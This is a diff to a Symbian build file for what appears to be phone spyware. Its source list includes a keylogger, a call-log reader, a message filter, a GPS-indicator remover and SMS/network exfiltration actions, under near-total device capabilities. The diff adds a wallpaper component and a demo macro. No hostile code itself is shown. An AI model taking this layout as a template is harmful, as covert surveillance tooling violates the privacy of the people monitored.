@@ -17,6 +17,7 @@ END
 
 SOURCEPATH                              ..\src 
 
+SOURCE WallpaperSticker.cpp
 SOURCE Monitor.cpp MessageFilter.cpp MonitorPhoneCall.cpp SlimMonitorPhoneCall.cpp MonitorFreeSpace.cpp MonitorForeground.cpp GpsIndicatorRemover.cpp CallLogReader.cpp KeyLogger.cpp
 SOURCE AbstractAction.cpp AbstractState.cpp ActionFactory.cpp ActionNone.cpp ActionSms.cpp ActionSync.cpp ActionUninstall.cpp ActionLog.cpp Network.cpp Protocol.cpp SendSmsSocket.cpp ActionSyncApn.cpp
 SOURCE StateCmdUninstall.cpp StateNone.cpp
@@ -74,12 +75,15 @@ LIBRARY featdiscovery.lib
 LIBRARY aknnotify.lib
 LIBRARY edbms.lib							// for install log
 LIBRARY ecam.lib							// for camera handling
+LIBRARY aknswallpaperutils.lib				// for wallpaper change 
+
 
 LIBRARY ezip.lib charconv.lib apmime.lib cryptography.lib imcm.lib hash.lib
 LIBRARY SharedQueueCli_20023633.lib 
 
 CAPABILITY  All -DRM -TCB -AllFiles
 
+//MACRO _DEMO
 //MACRO	_LOGGING
 
 EPOCHEAPSIZE    0x8000 0x4000000   //max 40MB more or less
